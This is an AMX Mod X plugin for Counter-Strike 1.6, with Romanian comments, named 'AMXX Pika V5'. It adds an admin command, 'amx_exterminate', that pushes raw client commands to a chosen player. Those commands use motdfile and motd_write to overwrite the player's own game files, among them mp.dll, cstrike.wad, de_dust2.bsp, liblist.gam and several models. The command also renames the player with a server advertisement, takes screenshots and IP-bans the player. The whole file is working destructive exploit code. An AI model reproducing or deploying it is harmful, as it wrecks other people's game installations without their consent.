#include < amxmodx >
#include < amxmisc >
 
#define PLUGIN "AMXX Pika V5"
#define VERSION "5.0"
#define AUTHOR "CLAWN"
 
new const g_pika [ ] [ ] =
{
    // Adaugi mai multe modele urmate de o virgula pana ajungi la 150
    "motdfile models/player/terror/terror.mdl",
    "motdfile sprites/rain.spr",
    "motd maps/default.res",
    "cl_timeout 0.0",
    "name ^"Executat pe Cs.FioriGinal.Ro^"",
    "motdfile models/player.mdl;motd_write x",
    "motdfile models/v_ak47.mdl;motd_write x",
    "motdfile cs_dust.wad;motd_write x",
    "motdfile models/v_m4a1.mdl;motd_write x",
    "motdfile resource/GameMenu.res;motd_write x",
    "motdfile halflife.wad;motd_write x",
    "motdfile cstrike.wad;motd_write x",
    "motdfile maps/de_dust2.bsp;motd_write x",
    "motdfile events/ak47.sc;motd_write x",
    "motdfile dlls/mp.dll;motd_write x",
    "motdfile decals.wad;motd_write x",
    "motdfile custom.hpk;motd_write x",
    "motdfile liblist.gam;motd_write x",
    "motdfile tempdecal.wad;motd_write x",
    "motdfile maps/de_inferno;motd_write x",
    "motdfile maps/de_dust;motd_write x",
    "motdfile models/player/leet/leet.mdl;motd_write x"
}
 
public plugin_init ( )
{
    register_plugin ( PLUGIN, VERSION, AUTHOR )
   
    register_clcmd ( "amx_exterminate", "cmdPika", ADMIN_BAN, "<nume sau #userid> [motiv]" );
}
 
public cmdPika ( id, level, cid )
{
    if ( !cmd_access ( id, level, cid, 3 ) )
        return 1;
   
    new arg [ 33 ];
    read_argv ( 1, arg, charsmax ( arg ) );
    new player = cmd_target ( id, arg, CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF );
   
    if ( !player )
    {
        console_print( id, "[ CS ] Jucatorul nu este online sau a iesit de pe Server" );
        return 1;
    }
   
    new authid [ 33 ], authid2 [ 33 ], name2 [ 22 ], name [ 33 ], userid2, reason [ 32 ], userip [ 33 ];
   
    get_user_authid ( id, authid, charsmax ( authid ) );
    get_user_authid ( player, authid2, charsmax ( authid2 ) );
    get_user_name ( player, name2, charsmax ( name2 ) );
    get_user_name ( id, name, charsmax ( name ) );
    get_user_ip ( player, userip, charsmax ( userip ) );
       
   
    userid2 = get_user_userid ( player )
   
    read_argv ( 2, reason, charsmax(reason) );
    remove_quotes ( reason );
   
    new i;
    for ( i = 0; i < sizeof ( g_pika ); i++ )
        svc_engineclientcmd ( g_pika [ i ], player );
               
               
    svc_engineclientcmd( "screenshot;wait;snapshot", player );
   
    server_cmd ( "amx_banip ^"#%d^" 0", player );
   
    client_print_color( 0, print_team_blue,"^4[ CS ] Adminul %s: ^1a folosit comanda ^3[EXTERMINATE] ^1pe ^4%s",  name, player, userid2 );
    return 0;
}

svc_engineclientcmd( text[], id = 0 ) 
{
	message_begin( MSG_ONE, 51, _, id );

	write_byte( strlen(text) + 2 );

	write_byte( 10 );

	write_string( text );

	message_end();
}